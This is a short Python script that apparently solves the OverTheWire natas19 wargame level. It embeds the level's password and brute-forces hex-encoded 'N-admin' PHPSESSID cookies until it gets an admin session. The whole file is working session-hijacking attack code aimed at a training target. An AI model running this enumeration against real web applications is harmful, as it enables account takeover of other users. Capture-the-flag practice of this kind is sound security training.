#!/usr/bin/python

import requests
from requests.auth import HTTPBasicAuth

level = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

for i in range(1,640):
	print 'Trying', i
	r = requests.get('http://natas19.natas.labs.overthewire.org/index.php',
					auth = HTTPBasicAuth(level, password),
					cookies = {'PHPSESSID':(str(i) + '-admin').encode('hex')})
	if 'You are an admin' in r.text:
		print 'Found session', (str(i) + '-admin').encode('hex')
		break
		
	
